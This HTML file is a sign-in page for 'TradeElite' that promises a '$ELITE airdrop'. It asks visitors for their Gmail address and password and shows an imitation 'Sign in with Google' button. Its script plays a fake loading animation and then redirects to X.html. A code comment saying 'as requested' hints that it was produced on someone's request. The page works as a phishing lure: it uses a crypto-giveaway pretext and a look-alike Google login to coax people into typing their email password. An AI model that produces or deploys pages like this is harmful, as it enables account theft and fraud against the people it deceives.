<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TradeElite - Sign in</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        
        body {
            font-family: 'Inter', system-ui, sans-serif;
            background: linear-gradient(135deg, #0a0f1c, #1a2338);
            color: #e2e8f0;
            margin: 0; padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: rgba(15, 23, 42, 0.98);
            border: 1px solid #334155;
            border-radius: 20px;
            padding: 40px 30px;
            width: 420px;
            text-align: center;
            box-shadow: 0 25px 60px -10px rgb(0 0 0 / 0.6);
        }
        .logo {
            width: 64px; height: 64px; background: #22c55e; color: #0f172a;
            border-radius: 50%; display: inline-flex; align-items: center;
            justify-content: center; font-size: 32px; font-weight: 700; margin-bottom: 24px;
        }
        h1 { font-size: 24px; margin: 0 0 8px 0; color: white; }
        p { color: #94a3b8; margin-bottom: 28px; font-size: 15px; }

        input {
            width: 100%;
            padding: 14px 16px;
            background: #1e2937;
            border: 1px solid #475569;
            border-radius: 10px;
            color: #e2e8f0;
            font-size: 15px;
            margin-bottom: 14px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #22c55e;
        }

        .gmail-btn {
            display: flex; align-items: center; justify-content: center; gap: 12px;
            background: white; color: #1f2937; border: none; border-radius: 12px;
            padding: 14px 24px; font-size: 16px; font-weight: 600; cursor: pointer;
            width: 100%; margin: 20px 0 16px 0;
        }
        .gmail-btn:hover { background: #f1f5f9; }

        button.continue {
            background: #22c55e; 
            color: #0f172a; 
            font-weight: 700;
            padding: 15px; 
            width: 100%; 
            border: none; 
            border-radius: 12px;
            font-size: 16px; 
            cursor: pointer;
        }

        .info {
            margin-top: 24px;
            font-size: 13px;
            color: #64748b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">TE</div>
        <h1>Sign in to TradeElite</h1>
        <p>Use your Gmail to claim your $ELITE airdrop</p>

        <input type="email" id="email" placeholder="Email address" value="user@gmail.com">
        <input type="password" id="password" placeholder="Password">

        <button class="gmail-btn" onclick="signInWithGoogle()">
            
            Sign in with Google
        </button>

        <button class="continue" onclick="signIn()">Sign in</button>

        <div class="info">
            By signing in, you agree to our Terms of Service
        </div>
    </div>

    <script>
        function signInWithGoogle() {
            fakeLoading("Signing in with Google...");
            setTimeout(() => {
                window.location.href = "X.html";
            }, 1350);
        }

        function signIn() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!email || !password) {
                alert("Please enter both email and password");
                return;
            }

            fakeLoading("Signing in...");
            setTimeout(() => {
                window.location.href = "X.html";   // ← Changed to X.html as requested
            }, 1350);
        }

        function fakeLoading(message) {
            const container = document.querySelector('.container');
            container.innerHTML = `
                <div style="padding: 80px 20px; color: #94a3b8;">
                    <div style="margin-bottom: 24px; font-size: 18px;">${message}</div>
                    <div style="width: 48px; height: 48px; border: 5px solid #334155; 
                                border-top: 5px solid #22c55e; border-radius: 50%; 
                                margin: 0 auto; animation: spin 1s linear infinite;"></div>
                </div>
                <style>
                    @keyframes spin { to { transform: rotate(360deg); } }
                </style>
            `;
        }
    </script>
</body>
</html>
